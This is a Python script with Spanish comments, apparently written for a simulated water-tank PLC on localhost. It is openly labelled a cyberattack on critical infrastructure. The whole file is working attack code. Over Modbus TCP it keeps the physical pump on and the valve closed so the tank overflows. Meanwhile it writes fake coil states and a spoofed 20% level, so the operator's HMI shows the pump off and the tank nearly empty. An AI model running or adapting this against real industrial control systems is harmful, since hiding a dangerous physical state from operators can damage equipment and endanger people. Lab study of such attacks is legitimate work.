import time
from pymodbus.client import ModbusTcpClient


HOST = "localhost"
PORT = 5020
DEVICE_ID = 1            # Coincide con el contexto del servidor (PLC)
FAKE_LEVEL = 20          # Valor que verá el operador
WRITE_INTERVAL = 0.2     # Frecuencia con la que forzamos el PLC
COIL_BOMBA = 0            # Bomba (estado público que ve el operador)
COIL_VALVULA = 1          # Válvula (estado público que ve el operador)
COIL_FORZAR_SENSOR = 2    # Evita que el PLC sobreescriba el valor falsificado
COIL_FORZAR_ACT = 3       # Fuerza a la física a usar bobinas dedicadas
COIL_BOMBA_REAL = 10      # Estado físico de la bomba (oculto al operador)
COIL_VALVULA_REAL = 11    # Estado físico de la válvula (oculto al operador)
COIL_FORZAR_HB = 12       # Heartbeat del forzado (permite liberar control al parar)


def main():
    client = ModbusTcpClient(HOST, port=PORT)
    if not client.connect():
        raise SystemExit(f"No se pudo conectar al PLC en {HOST}:{PORT}")

    print("=== INICIANDO CIBERATAQUE A INFRAESTRUCTURA CRÍTICA ===")
    print("Objetivo: desbordar el tanque manteniendo la bomba encendida, la válvula cerrada y falsificando el sensor (sin que el operador lo perciba).")
    print("Pulsa Ctrl+C para detener el ataque.\n")

    tick = 0
    hb_state = False
    try:
        while True:
            # 1) Forzar que la física use bobinas dedicadas (ocultando las públicas al operador)
            client.write_coil(COIL_FORZAR_ACT, True, device_id=DEVICE_ID)
            # 2) Estado público: operador verá bomba OFF y válvula cerrada
            client.write_coil(COIL_BOMBA, False, device_id=DEVICE_ID)
            client.write_coil(COIL_VALVULA, False, device_id=DEVICE_ID)
            # 3) Estado físico real: bomba encendida (llenando) y válvula cerrada
            client.write_coil(COIL_BOMBA_REAL, True, device_id=DEVICE_ID)
            client.write_coil(COIL_VALVULA_REAL, False, device_id=DEVICE_ID)
            # 4) Forzar que el PLC no reescriba el sensor desde la física
            client.write_coil(COIL_FORZAR_SENSOR, True, device_id=DEVICE_ID)
            # 5) Heartbeat del forzado (para liberar control al parar)
            hb_state = not hb_state
            client.write_coil(COIL_FORZAR_HB, hb_state, device_id=DEVICE_ID)
            # 6) Falsificar el nivel para que el HMI crea que el tanque está casi vacío
            client.write_register(0, FAKE_LEVEL, device_id=DEVICE_ID)

            tick += 1
            if tick % 10 == 0:
                print(f"[{tick:04d}] Bomba física ON | Válvula física cerrada | Operador ve bomba OFF | Nivel falsificado a {FAKE_LEVEL}%")

            time.sleep(WRITE_INTERVAL)
    except KeyboardInterrupt:
        print("\nAtaque detenido por el operador.")
    finally:
        # Restaurar controles para que vuelva a verse el nivel real y el control legítimo
        client.write_coil(COIL_FORZAR_SENSOR, False, device_id=DEVICE_ID)
        client.write_coil(COIL_FORZAR_ACT, False, device_id=DEVICE_ID)
        client.write_coil(COIL_FORZAR_HB, False, device_id=DEVICE_ID)
        client.write_coil(COIL_BOMBA_REAL, False, device_id=DEVICE_ID)
        client.write_coil(COIL_VALVULA_REAL, False, device_id=DEVICE_ID)
        client.write_coil(COIL_BOMBA, False, device_id=DEVICE_ID)
        client.write_coil(COIL_VALVULA, False, device_id=DEVICE_ID)
        client.close()


if __name__ == "__main__":
    main()
